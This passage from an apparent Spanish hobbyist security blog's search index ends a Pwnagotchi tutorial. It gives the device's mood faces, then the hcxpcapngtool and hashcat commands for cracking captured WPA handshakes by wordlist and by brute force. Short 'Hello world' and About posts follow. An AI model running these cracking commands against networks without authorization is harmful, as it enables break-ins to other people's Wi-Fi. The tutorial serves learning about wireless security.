con un alto nivel de bonos. si no has leído mensajes pwnmail en esa unidad. (✜‿‿✜) inteligente aleatoriamente si se cumple una unidad con un nivel de bonos medio-alto.\n(♥‿‿♥) amistoso aleatoriamente si se cumple una unidad con un alto nivel de bonos.\n(☼‿‿☼) motivado tu pwnagotchi acaba de obtener la mejor puntuación-nivel de recompensa en su existencia o acaba de conocer una unidad con un vínculo alto.\n(≖__≖) desmotivado tu pwnagotchi acaba de anotar lo peor nivel de recompensa en su existencia.\n(-__-) aburrido si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.bored_num_epochs.\n(╥☁╥) triste si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.sad_num_epochs. (ب__ب) solitario si su pwnagotchi acaba de perder el contacto con una unidad amiga que estaba cerca, o si la cantidad de interacciones perdidas con puntos de acceso o estaciones de clientes (la cantidad de veces que intentó enviar algún tipo de paquete, pero falló el objetivo porque no está en rango ya) es mayor o igual que personality.max_misses_for_recon. y no hay unidades amigas alrededor.\n(☓‿‿☓) roto su unidad se está reiniciando como una estrategia para solucionar un bug de ceguera temporal después de instalar una actualización.\n(#__#) depuración se utiliza para depurar y probar mensajes en pantalla.\nficheros de handshakes los handshakes capturados se guardan en ficheros con extensión “.pcap” dentro del pwnagotchi. estos se pueden descifrar más tarde mediante hardware y software adecuados, como por ejemplo hashcat tras convertirlo al formato adecuado con hcxpcapngtool (hcxtools).\nhcxtools\nhashcat\nlos siguientes ejemplos se han realizado usando un equipo de sobremesa con kali linux.\nconvertir fichero pcap a hc22000 con hcxpcapngtool hcxpcapngtool -o hash.hc22000 -e essidlist fichero.pcap donde \u0026ldquo;hash.hc22000\u0026rdquo; es el nombre del fichero donde guardara el hash, y \u0026ldquo;essidlist\u0026rdquo; el fichero donde guardara el nombre del ssid.\nsi no tienes a mano esta herramienta, puedes usar este conversor online\ndescifrar el hash obtenido con hashcat metodo best64 + wordlist\nhashcat -m 22000 fichero_hash -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a -o outfile.txt para ver a que corresponden las opciones usadas, ejecutar hashcat -h y al final salen los cuadros con estas opciones explicadas.\nhasta aquí llega el tutorial. seguramente se podría seguir indagando más en el tema del pwngrid, el pwnmail y los peers, pero se haría excesivamente largo. os animo a que sigáis investigando y aprendiendo, y sobre todo que os llevéis siempre encima a vuestro pwnagotchi. ¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Tutorial Pwnagotchi"},{"date":"2022-09-12","image":"","link":"https://k3ssdev.github.io/posts/hello-world/","summary":"Empiezo otro blog \u0026gt; Hola gente. Al final me he puesto y me he creado un pequeño blog estático.\nHe usado Hugo para hacerlo y GitHub Pages para el hospedaje. Aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo.","tags":[],"text":"empiezo otro blog \u0026gt; hola gente. al final me he puesto y me he creado un pequeño blog estático.\nhe usado hugo para hacerlo y github pages para el hospedaje. aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo. básicamente será un cuaderno de notas sobre sistemas y seguridad\u0026hellip;\n¡nos vemos!\n(◕‿‿◕) ~ hack the planet!\n","title":"Hello, world"},{"date":"0001-01-01","image":"","link":"https://k3ssdev.github.io/pages/about/","summary":"¡Hola mundo!\nMi nombre es Alberto Pérez, pero en redes me gusta usar el nick de k3ssdev. Soy Administrador de Sistemas en Red y certificado en Linux por Linux Professional Institute.\nActualmente compagino mi trabajo como técnico de sistemas con Linux y bases de datos con los estudios de CFGS de Desarrollo de Aplicaciones Multiplataforma.","tags":[],"text":"¡hola mundo!\nmi nombre es alberto pérez, pero en redes me gusta usar el nick de k3ssdev. soy administrador de sistemas en red y certificado en linux por linux professional institute.\nactualmente compagino mi trabajo como técnico de sistemas con linux y bases de datos con los estudios de cfgs de desarrollo de aplicaciones multiplataforma. soy entusiasta de la ciberseguridad, dedico también parte de mi tiempo formarme sobre ethical hacking y pentesting, además de resolver retos ctf en plataformas como tryhackme.\nmis perfiles linkdin e-mail github tryhackme ¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"About"}]
}

